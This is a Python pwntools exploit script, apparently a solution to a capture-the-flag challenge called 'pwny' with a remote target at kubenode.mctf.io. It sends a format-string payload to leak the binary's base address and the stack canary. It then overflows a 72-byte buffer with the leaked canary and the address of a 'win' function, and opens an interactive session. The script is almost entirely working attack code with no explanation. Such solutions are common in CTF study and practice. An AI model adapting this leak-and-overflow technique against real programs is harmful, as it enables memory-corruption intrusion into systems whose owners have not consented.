from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwny"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("kubenode.mctf.io", 30012)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

win = 0x011B9
payload = "--%6$p--%19$p--"
ddebug("breakrva 0x00012e2 \n continue")
io.sendlineafter("Enter your pony's name: ", payload)

io.recvuntil("--", drop=True)
leak = io.recvuntil("--", drop=True)
elf.address = int(leak, 16) - 0x20f0
log.success("elf.address :-----> " + hex(elf.address))
leak = io.recvuntil("--", drop=True)
canary = int(leak, 16)
log.success("canary :-----> " + hex(canary))

payload = b"a"*72
payload += p64(canary)
payload += p64(0)
payload += p64(elf.symbols["win"])
io.sendlineafter("Enter your pony's name: ", payload)

io.interactive()
